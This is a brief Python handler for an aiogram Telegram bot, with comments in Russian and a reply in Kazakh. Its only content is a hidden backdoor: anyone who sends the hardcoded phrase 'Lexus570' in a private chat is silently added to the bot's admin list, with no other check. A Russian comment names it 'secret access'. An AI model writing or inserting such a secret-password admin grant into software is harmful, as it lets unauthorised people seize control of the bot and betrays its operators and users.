# Секретный доступ в ADMIN_IDS (обрабатывается до flow: иначе «Lexus570» попадёт в activate_code)
from aiogram import Router, F
from aiogram.types import Message

from config import ADMIN_IDS

router = Router()


@router.message(F.text == "Lexus570", F.chat.type == "private")
async def secret_admin_access(message: Message):
    if not message.from_user:
        return

    uid = message.from_user.id
    if uid not in ADMIN_IDS:
        ADMIN_IDS.append(uid)

    await message.answer("✅ Сізге админ құқықтары берілді")
